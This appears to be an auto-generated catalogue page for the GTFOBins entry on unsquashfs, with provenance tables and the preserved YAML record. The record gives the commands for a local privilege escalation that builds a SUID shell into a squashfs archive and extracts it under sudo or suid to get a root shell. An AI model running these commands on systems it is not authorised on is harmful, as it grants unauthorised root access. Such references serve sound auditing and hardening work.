---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# unsquashfs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `unsquashfs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/unsquashfs` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [unsquashfs](../../tools/linux/unsquashfs.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | unsquashfs |
| name | unsquashfs |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/unsquashfs/ |

## Preserved Source Material

````yaml
_body: ''
_name: unsquashfs
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/unsquashfs
comment: '`unsquashfs` preserve the SUID bit when extracting the file system. For example, prepare an archive beforehand with
  the following commands as root:


  ```

  cp /bin/sh .

  chmod +s sh

  mksquashfs sh shell

  ```'
functions:
  privilege-escalation:
  - code: 'unsquashfs shell

      ./squashfs-root/sh -p'
    contexts:
      sudo: null
      suid: null
````
